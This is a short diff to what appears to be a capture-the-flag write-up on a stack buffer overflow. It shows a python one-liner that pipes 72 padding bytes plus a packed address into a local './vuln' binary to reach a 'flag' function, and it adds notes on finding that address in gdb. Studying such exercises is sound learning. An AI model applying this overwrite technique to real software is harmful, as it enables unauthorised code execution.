@@ -52,3 +52,9 @@ Note: $rip is one address above the $rbp.
 python -c 'import struct; print("A"*72+struct.pack("<I",0x0000000000400768) )'|./vuln
 ```
 For some reason I had to add one byte to the add of `flag` function.
+
+I found that the address if we use `info add <fun name>` is different by one byte. So maybe we should use `info add` to get the address
+```
+(gdb)info add flag
+0x0000000000400768
+```
